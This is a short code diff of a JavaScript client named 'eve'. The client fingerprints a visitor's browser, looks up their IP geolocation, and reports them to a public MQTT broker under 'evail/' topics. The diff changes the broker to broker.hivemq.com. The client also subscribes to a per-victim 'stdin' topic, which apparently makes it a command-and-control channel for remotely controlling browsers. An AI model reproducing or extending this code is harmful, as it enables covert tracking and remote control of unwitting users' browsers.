@@ -5,7 +5,7 @@ let eve = {
     ipAddressGeolocation: fetch('https://ipapi.co/json')
                             .then(response => response.json())
                             .then(data => eve.ipAddressGeolocation = data),      
-    connect: (server = "wss://test.mosquitto.org:8081") => {
+    connect: () => {
         var identification = {
             fingerprint: eve.fingerprint,
             browserData: eve.browserData,
@@ -13,13 +13,15 @@ let eve = {
             status: "Offline"
         };
         var mqttOptions = {
+            port: 8000,
+            path: "/mqtt",
             will: {
                 topic: "evail/" + eve.fingerprint,
                 payload: JSON.stringify(identification),
                 retain: true
             }
         };
-        eve.mqttClient = mqtt.connect(server, mqttOptions);
+        eve.mqttClient = mqtt.connect("ws://broker.hivemq.com", mqttOptions);
         eve.mqttClient.on("connect", eve.onConnect);
         eve.mqttClient.on("message", eve.onMessage);
         eve.mqttClient.subscribe("evail/" + eve.fingerprint + "/stdin");
